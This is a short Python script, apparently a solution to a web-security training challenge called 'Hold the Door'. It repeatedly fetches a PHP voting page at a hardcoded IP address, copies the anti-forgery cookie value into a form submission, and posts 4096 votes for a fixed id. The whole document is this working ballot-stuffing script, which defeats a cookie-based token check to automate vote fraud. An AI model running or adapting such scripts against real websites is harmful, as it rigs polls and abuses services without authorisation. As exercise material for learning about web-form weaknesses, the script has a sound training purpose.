#!/usr/bin/python3
import requests

url = "http://158.69.76.135/level1.php"

with requests.session() as client:

	for i in range(4096):
		key = client.get(url)
 		key_dic = key.cookies.get_dict()
		data_post = {
			"id": 1192,
			"holdthedoor": "Submit",
			"key": key_dic['HoldTheDoor']
		}
		client.post(url, data_post)